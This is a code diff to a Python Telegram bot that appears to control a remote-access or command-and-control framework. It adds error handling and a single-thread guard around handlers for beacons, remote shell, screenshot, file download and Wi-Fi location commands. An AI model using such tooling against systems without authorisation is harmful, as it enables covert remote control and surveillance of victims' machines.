@@ -50,6 +50,7 @@ if _allowed_str:
 
 active_beacon = None
 bot_app = None
+_bot_thread = None
 
 
 def _api_get(path):
@@ -371,34 +372,43 @@ def start_bot():
         logger.error("PHANTOM_TELEGRAM_BOT_TOKEN non impostato nel .env")
         return
 
-    app = Application.builder().token(BOT_TOKEN).build()
-    bot_app = app
+    try:
+        app = Application.builder().token(BOT_TOKEN).build()
+        bot_app = app
 
-    auth_filter = filters.User(user_id=list(ALLOWED_USERS))
-    allowed_count = len(ALLOWED_USERS)
-    print(f"[Telegram] auth_filter applied. Allowed users: {allowed_count}")
+        auth_filter = filters.User(user_id=list(ALLOWED_USERS))
+        allowed_count = len(ALLOWED_USERS)
+        print(f"[Telegram] auth_filter applied. Allowed users: {allowed_count}")
 
-    app.add_handler(CommandHandler("start", _cmd_start, filters=auth_filter))
-    app.add_handler(CommandHandler("beacons", _cmd_beacons, filters=auth_filter))
-    app.add_handler(CommandHandler("interact", _cmd_interact, filters=auth_filter))
-    app.add_handler(CommandHandler("exit", _cmd_exit, filters=auth_filter))
-    app.add_handler(CommandHandler("results", _cmd_results, filters=auth_filter))
-    app.add_handler(CommandHandler("help", _cmd_help, filters=auth_filter))
+        app.add_handler(CommandHandler("start", _cmd_start, filters=auth_filter))
+        app.add_handler(CommandHandler("beacons", _cmd_beacons, filters=auth_filter))
+        app.add_handler(CommandHandler("interact", _cmd_interact, filters=auth_filter))
+        app.add_handler(CommandHandler("exit", _cmd_exit, filters=auth_filter))
+        app.add_handler(CommandHandler("results", _cmd_results, filters=auth_filter))
+        app.add_handler(CommandHandler("help", _cmd_help, filters=auth_filter))
 
-    app.add_handler(CommandHandler("shell", _cmd_shell, filters=auth_filter))
-    app.add_handler(CommandHandler("screenshot", _cmd_screenshot, filters=auth_filter))
-    app.add_handler(CommandHandler("download", _cmd_download, filters=auth_filter))
-    app.add_handler(CommandHandler("wlan_locate", _cmd_wlan_locate, filters=auth_filter))
+        app.add_handler(CommandHandler("shell", _cmd_shell, filters=auth_filter))
+        app.add_handler(CommandHandler("screenshot", _cmd_screenshot, filters=auth_filter))
+        app.add_handler(CommandHandler("download", _cmd_download, filters=auth_filter))
+        app.add_handler(CommandHandler("wlan_locate", _cmd_wlan_locate, filters=auth_filter))
 
-    app.add_handler(MessageHandler(filters.COMMAND & (auth_filter or filters.ALL), _cmd_fallback))
+        app.add_handler(MessageHandler(filters.COMMAND & (auth_filter or filters.ALL), _cmd_fallback))
 
-    logger.info("Telegram bot avviato.")
-    app.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=[], drop_pending_updates=True)
+        logger.info("Telegram bot avviato.")
+        app.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=[], drop_pending_updates=True)
+    except Exception as e:
+        logger.error(f"Telegram bot error: {e}")
+        print(f"[Telegram Bot] ERRORE: {e}")
 
 
 def run():
+    global _bot_thread
+    if _bot_thread and _bot_thread.is_alive():
+        print("[Telegram Bot] Già in esecuzione")
+        return _bot_thread
     t = threading.Thread(target=start_bot, daemon=True)
     t.start()
+    _bot_thread = t
     print("[Telegram Bot] Avviato in background")
     return t
 
